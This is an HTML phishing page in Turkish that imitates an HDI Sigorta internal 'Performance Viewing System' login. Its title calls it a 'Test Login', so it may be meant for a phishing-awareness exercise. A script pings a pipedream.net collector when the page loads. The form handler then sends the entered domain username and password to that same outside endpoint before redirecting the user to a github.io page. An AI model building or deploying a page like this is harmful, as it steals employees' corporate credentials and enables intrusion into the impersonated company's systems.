<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Performans Görüntüleme Sistemi - Test Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      background: linear-gradient(135deg, #f2f4f7, #dce3e9);
      font-family: 'Segoe UI', Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .login-box {
      background: #fff;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, .08);
      width: 340px;
      text-align: center;
    }
    .login-box img {
      width: 110px;
      margin-bottom: 14px;
    }
    .login-box h2 {
      color: #007A33;
      font-size: 17px;
      margin: 0 0 18px;
    }
    .login-box input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #cfd8dc;
      border-radius: 6px;
      font-size: 14px;
    }
    .login-box button {
      width: 100%;
      padding: 12px;
      background: #007A33;
      color: #fff;
      border: none;
      border-radius: 6px;
      font-weight: 600;
      cursor: pointer;
    }
    .login-box p {
      font-size: 12px;
      color: #666;
      margin-top: 12px;
    }
    @media (max-width: 480px) {
      .login-box {
        width: 90%;
        padding: 30px;
      }
      .login-box img {
        width: 90px;
      }
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://cbcsigorta.com/resim/upload/118.png" alt="HDI Logo" />
    <h2>Performans Görüntüleme Sistemi</h2>

    <script>
      // Sayfa yüklenince bir GET isteği atar
      fetch("https://eod8ohq1x7p49bb.m.pipedream.net/openpms", {
        method: "GET",
        mode: "no-cors"
      });
    </script>

    <form id="loginForm" autocomplete="off">
      <input type="text" name="username" placeholder="Domain Hesabı" required autocomplete="off" />
      <input type="password" name="password" placeholder="Şifre" required autocomplete="new-password" />
      <button type="submit">Giriş Yap</button>
    </form>

    <p>© 2025 HDI Sigorta | Tüm hakları saklıdır.</p>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", async function(e) {
      e.preventDefault(); // sayfa yenilenmesini engelle
      const formData = new FormData(this);

      // POST isteği pipedream'e gönder
      await fetch("https://eod8ohq1x7p49bb.m.pipedream.net", {
        method: "POST",
        body: formData,
        mode: "no-cors"
      });

      // Ardından hedef sayfaya yönlendir
      window.location.href = "https://hdisigorta.github.io/HDI-PMS/pms.html";
    });
  </script>
</body>
</html>
